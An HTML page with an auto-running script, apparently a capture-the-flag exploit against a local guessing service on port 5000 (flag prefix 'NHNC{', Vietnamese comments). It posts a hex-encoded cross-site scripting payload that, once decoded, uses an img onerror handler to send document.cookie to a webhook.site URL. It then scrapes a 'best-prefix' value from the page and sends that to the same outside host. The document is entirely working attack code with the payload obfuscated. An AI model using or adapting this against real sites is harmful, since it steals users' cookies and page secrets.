<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Auto Guess Payload</title>
</head>
<body>
  <h2>Auto Guess Payload Running...</h2>
  <script>
    (async () => {
      // Chuỗi hex cho trường note (ví dụ payload bạn muốn encode)
      const noteHex = `
3c696d67207372633d31206f6e6572726f723d22666574636828276874
74703a2f2f776562686f6f6b2e736974652f62356561393332652d6566
64352d346431352d383862632d3936663631636338353237613f6c6561
6b3d272b646f63756d656e742e636f6f6b696529223e
`.replace(/\s+/g, '');

      // Gửi POST guess + note tới server local
      await fetch('http://127.0.0.1:5000/guess', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        credentials: 'include',
        body: JSON.stringify({ guess: 'NHNC{', note: noteHex })
      });

      // Lấy inner.html để đọc best-prefix
      const res = await fetch('http://127.0.0.1:5000/inner.html', { credentials: 'include' });
      const html = await res.text();
      const prefixMatch = html.match(/<span id="best-prefix">(.*?)<\/span>/);
      const prefix = prefixMatch ? prefixMatch[1] : '(none)';

      // Gửi prefix ra webhook.site
      await fetch('https://webhook.site/b5ea932e-efd5-4d15-88bc-96f61cc8527a?leak=' + encodeURIComponent(prefix));
    })();
  </script>
</body>
</html>
